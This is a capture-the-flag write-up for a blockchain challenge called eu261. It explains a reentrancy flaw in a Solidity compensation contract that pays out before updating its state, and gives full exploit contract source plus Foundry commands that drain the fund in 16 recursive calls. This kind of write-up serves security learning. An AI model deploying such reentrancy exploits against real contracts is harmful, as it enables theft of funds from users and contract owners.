# [eu261](https://nnsc.tf/challenges?challenge=blockchain_eu261)

**Description:**

Finally my favorite flight, SK4045, from ENGM to ENZV, the best airport in the whole world!

Except we arrived more than three hours late. But I hope you SmartDelayed and filed your EU261 claim. The compensation desk is automated now and pays out on-chain, one claim per passenger. Allegedly.

## Finding the bug

`CompensationFund.collect()` looks roughly like this:

```solidity
function collect(uint256 fundId, uint256 passId) external {
    Fund storage fund = funds[fundId];
    require(boardingPass.ownerOf(passId) == msg.sender, ...);
    require(keccak256(...) == keccak256(...), ...);
    require(!redeemed[fundId][passId], "already collected");
    require(fund.balance >= fund.compensation, "fund is empty");

    (bool ok,) = msg.sender.call{value: fund.compensation}("");
    require(ok, "payout failed");

    redeemed[fundId][passId] = true;
    fund.balance -= fund.compensation;
}
```

The ETH is sent to `msg.sender` before `redeemed` and `fund.balance` get updated. This is a checks-effects-interactions violation. If `msg.sender` is a contract, its `receive()` function runs during that `.call`, and it can call `collect()` again. Both `require` checks will still read the old, un-decremented values, so the second call passes too.

## Doing the math

From the deployment parameters:

- Distance for `SK4045` is 341 km, which falls in Band A.
- Delay is 3 hours, which is above the 2 hour threshold for Band A, so there's no 50% reduction.
- Compensation per `collect()` call is `250 * 0.01 ether = 2.5 ether`.
- The fund is opened with 40 ether.
  `40 / 2.5 = 16`, exactly. So 16 successful `collect()` calls in a single reentrant chain drain the fund to precisely 0, which satisfies the solve condition.

One important detail: `collect()` ends with `require(ok, "payout failed")` right after the low-level call. If the fund genuinely runs out of ETH on a 17th call, that inner call fails, `ok` is `false`, and the `require` reverts. Because that revert happens inside a normal `collect()` call in every parent frame, it propagates all the way up and undoes the entire transaction, not just the last step. So the attacker has to recurse exactly 16 times, no more, and let the call stack unwind cleanly afterward.

## Writing the exploit contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

interface IFund {
    function collect(uint256 fundId, uint256 passId) external;
}

contract Exploit {
    IFund public immutable fund;
    uint256 public immutable fundId;
    uint256 public immutable passId;
    uint256 public count;
    uint256 public constant MAX_CALLS = 16; // 40 ether / 2.5 ether

    constructor(IFund _fund, uint256 _fundId, uint256 _passId) {
        fund = _fund;
        fundId = _fundId;
        passId = _passId;
    }

    function attack() external {
        count = 0;
        fund.collect(fundId, passId);
    }

    receive() external payable {
        count++;
        if (count < MAX_CALLS) {
            fund.collect(fundId, passId);
        }
    }

    function withdraw(address payable to) external {
        to.transfer(address(this).balance);
    }
}
```

`attack()` makes the first `collect()` call. Each time the fund contract pays out, `receive()` fires and immediately calls `collect()` again, until `count` reaches 16, at which point it stops and lets the stack unwind normally.

Get the constructor's `count` reset right. Since `receive()` increments `count` before deciding whether to recurse, `count` needs to start at 0 in `attack()`, not 1. Starting at 1 causes the recursion to stop one call early, leaving 2.5 ether stuck in the fund with `redeemed` already set to `true` for the only pass you have. There is no way to undo that on a live instance, since only the challenge's issuer key can mint a second boarding pass. If that happens, the fix is just to reconnect for a fresh instance rather than try to recover the old one.

## Step by step

### 1. Get instance info

```bash
ncat --ssl eu261-<instance>.chall.nnsc.tf 1337
```

Choose option `1`. This prints your RPC URL, your private key, and the `CompensationFund` address.

### 2. Install Foundry

```bash
curl -L https://foundry.paradigm.xyz | bash
export PATH="$PATH:$HOME/.foundry/bin"   # or wherever the installer put it
foundryup
```

### 3. Set up environment variables

```bash
export RPC_URL="https://eu261-rpc-<instance>.chall.nnsc.tf"
export PRIVATE_KEY="<private key from ncat>"
export PLAYER=$(cast wallet address --private-key $PRIVATE_KEY)
export FUND="<challenge contract address from ncat>"
export PASSES=$(cast call $FUND "boardingPass()(address)" --rpc-url $RPC_URL)
```

### 4. Verify state before doing anything irreversible

```bash
cast call $FUND "reserve()(uint256)" --rpc-url $RPC_URL
cast call $FUND "compensationOf(uint256)(uint256)" 0 --rpc-url $RPC_URL
cast call $PASSES "ownerOf(uint256)(address)" 0 --rpc-url $RPC_URL
```

Expect 40 ether reserve, 2.5 ether compensation, and pass 0 owned by `$PLAYER`.

### 5. Write and deploy the exploit contract

```bash
mkdir -p ~/eu261-exploit/src && cd ~/eu261-exploit
forge init --no-git --force .
rm -f src/Counter.sol script/Counter.s.sol test/Counter.t.sol

cat > src/Exploit.sol << 'EOF'
// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

interface IFund {
    function collect(uint256 fundId, uint256 passId) external;
}

contract Exploit {
    IFund public immutable fund;
    uint256 public immutable fundId;
    uint256 public immutable passId;
    uint256 public count;
    uint256 public constant MAX_CALLS = 16;

    constructor(IFund _fund, uint256 _fundId, uint256 _passId) {
        fund = _fund;
        fundId = _fundId;
        passId = _passId;
    }

    function attack() external {
        count = 0;
        fund.collect(fundId, passId);
    }

    receive() external payable {
        count++;
        if (count < MAX_CALLS) {
            fund.collect(fundId, passId);
        }
    }

    function withdraw(address payable to) external {
        to.transfer(address(this).balance);
    }
}
EOF

forge build

forge create src/Exploit.sol:Exploit \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY \
  --broadcast \
  --constructor-args $FUND 0 0
```

Note that `--constructor-args` needs to be the last flag on the command line. `forge create` reads it as a variable-length list of values and will happily swallow any flags that come after it, which causes a confusing "argument count mismatch" error.

Copy the deployed address:

```bash
export EXPLOIT="<Deployed to: address>"
```

### 6. Sanity check the deployment

```bash
cast call $EXPLOIT "fund()(address)" --rpc-url $RPC_URL
cast call $EXPLOIT "fundId()(uint256)" --rpc-url $RPC_URL
cast call $EXPLOIT "passId()(uint256)" --rpc-url $RPC_URL
```

Should return `$FUND`, `0`, `0`.

### 7. Transfer the boarding pass to the exploit contract

`collect()` checks `boardingPass.ownerOf(passId) == msg.sender`, and during the attack `msg.sender` will be the exploit contract, not your EOA. So the pass has to move first.

```bash
cast send $PASSES "transferFrom(address,address,uint256)" $PLAYER $EXPLOIT 0 \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY

cast call $PASSES "ownerOf(uint256)(address)" 0 --rpc-url $RPC_URL
```

Confirm ownership now shows `$EXPLOIT`.

### 8. Fire the exploit

```bash
cast send $EXPLOIT "attack()" \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY
```

### 9. Verify the drain

```bash
cast call $FUND "reserve()(uint256)" --rpc-url $RPC_URL
cast call $FUND "isSolved()(bool)" --rpc-url $RPC_URL
cast call $EXPLOIT "count()(uint256)" --rpc-url $RPC_URL
cast balance $EXPLOIT --rpc-url $RPC_URL
```

Expect `reserve = 0`, `isSolved = true`, `count = 16`, and the exploit contract's balance equal to the full 40 ether.

### 10. Get the flag

```bash
ncat --ssl eu261-<instance>.chall.nnsc.tf 1337
```

Choose option `2`, confirm you've solved it, and the service returns the flag in `NNS{...}` format.

<img width="450" height="113" alt="SCREEN01" src="https://github.com/user-attachments/assets/a8dbea47-a1b1-4451-819a-c43d79e01863" />
